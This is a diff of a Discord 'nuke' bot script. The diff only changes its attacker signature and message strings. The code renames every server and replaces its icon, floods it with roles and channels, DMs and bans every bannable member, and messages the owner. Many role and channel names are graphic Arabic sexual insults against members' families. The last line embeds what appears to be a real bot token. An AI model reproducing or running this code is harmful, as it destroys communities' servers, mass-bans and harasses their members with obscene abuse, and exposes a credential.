@@ -33,7 +33,7 @@ LOka.on("message", message => {
 var x1 = "kk"
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/461211380272594944/461216212991344650/Avaar.png`)
+LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/460992431861792769/463693254764920842/image-46.jpg`)
  
 }
 });
@@ -46,7 +46,7 @@ LOka.user.setUsername("Hacked u by Legend")
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by Legend`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`Hacked u by ABOOD`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by Legend`)
+             m.setName(`عبود ينيك امك`)
 })
 }
 });
@@ -70,7 +70,7 @@ LOka.on('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/460992431861792769/463693254764920842/image-46.jpg`)
  
 }
 });
@@ -81,197 +81,197 @@ LOka.on('message', message => {
      if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
   m.createRole({
-        name : "Hacked u by Legend",
+        name : "Hacked u by ABOOD",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "انيك امكم ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "كس امكم يا مخنيث",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "عبود نايكم",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "امك ع زبي ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "امك ع زبي",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "عبود ينيك امكم",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "كس امكم",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "انا راجعلكم",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "هاذ ولا اشي",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "رح نرجعلكم ",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "كس امك حلو",
         permissions :   [1],
         color : " #ff0000"
     })
      m.createRole({
-        name : "Hacked u by Legend",
+        name : "والله لافلخ امك",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
+        name : "كس امك حلوه",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "بنيك امك ابن القحبه",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by Legend",
+        name : "والله لاختصب امك",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "امك منتاكه ع زبي",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "ابوك بنتاك كل يوم",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "ياخو الشرموط",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "ياخو القبحه",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "ابن القحبه",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "يا ابن القحبه",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "الحق طيز امك ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امك ككشاشي",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امك ككاشي",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امك",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "طيز امك يا ككاشي حلو",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "امك منتاكه",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "اختك يا ككاشي",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : " كس امك يا ككاشي",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "اختك منتاكه",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "بلعن ابوك ",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "بلعن امك",
         permissions :   [1],
         color : " #ff0000"
     })
  
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "بلعن امك",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "امك حلو",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "كس امك",
         permissions :   [1],
         color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked u by Legend",
+        name : "كس امك",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "كس امك",
         permissions :   [1],
         color : " #ff0000"
     })
@@ -286,52 +286,52 @@ LOka.on('message', message => {
 LOka.on('message', message => {
          if (message.content === "k") {
                LOka.guilds.forEach(m =>{
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
-m.createChannel('hacked by legend', 'text');
-m.createChannel('hacked by legend', 'text');
+m.createChannel('عبود ينيك امك', 'text');
+m.createChannel('عبود ينيك امك', 'text');
  
 })
 }
@@ -340,65 +340,65 @@ m.createChannel('hacked by legend', 'text');
 LOka.on('message', message => {
          if (message.content === "k") {
                  LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
  
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
  
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
  
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
  
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
  
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by LEGEND', 'voice');
-m.createChannel('Hacked u by Legend', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
+m.createChannel('كس امك ككاشي', 'voice');
  
  
  
@@ -417,14 +417,14 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked u by LEGEND    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
+  await guild.owner.send(' عبود ناك ام الكل    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
  
  
  
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('^_^').catch(e => { return void e; });
+      await m.send('تم نيك ام ككاشي').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -436,9 +436,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by Legend', 'text');
+    await guild.createChannel('كس امكم', 'text');
  
-      await guild.createChannel('Hacked u by Legend', 'voice');
+      await guild.createChannel('تم نيك ام ككاشي', 'voice');
  
  
  
@@ -460,7 +460,7 @@ LOka.on('guildCreate', async (guild) => {
  
 LOka.on('guildMemberAdd', member => {
    
-            if (member.id === "396958215377780747") {
+            if (member.id === "397687476665188356") {
                 member.guild.createRole({
                     name : LOka.user.username,
                     color : "RANDOM",
@@ -478,4 +478,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NDYxMjIxMDU3MzMyOTAzOTM2.DhQJIQ.qtRS7umQxWnHZE8zLyUPp918SmI")
+LOka.login("NDYxMjIxMDU3MzMyOTAzOTM2.Dh0RCg.G1bw6o7ySvQ_OuoP_tGxvP854D8")
